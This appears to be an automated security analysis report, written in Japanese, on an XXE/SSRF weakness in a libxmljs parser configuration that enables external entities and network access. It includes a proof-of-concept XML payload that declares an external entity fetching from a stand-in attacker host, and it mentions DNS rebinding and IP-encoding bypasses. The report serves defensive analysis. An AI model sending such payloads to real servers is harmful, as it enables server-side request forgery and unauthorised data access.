# Analysis Report

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `SSRF`
- `AFO`
- `XSS`

## PAR Policy Analysis

## 詳細解析

このコードでは、libxmljsのXMLパーサにおいて「replaceEntities: true」「nonet: false」が設定されており、外部エンティティ参照が無制限に許可されています。その結果、攻撃者は外部リソース（例えばhttp://attacker.com/secret.txtなど）をエンティティとして宣言し、サーバーにリクエストさせることでSSRFを引き起こせます。DNSリバインディングやIPエンコードを用いたバイパスも可能です。

## PoC（概念実証コード）

```text
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.example.com/secret">
]>
<data>
  <info>&xxe;</info>
</data>
```

## 解析ノート

libxmljs.parseXmlでnonet:falseによりネットワークアクセスが許可され、replaceEntities:trueで外部エンティティ展開が有効化。SSRF発生可能。

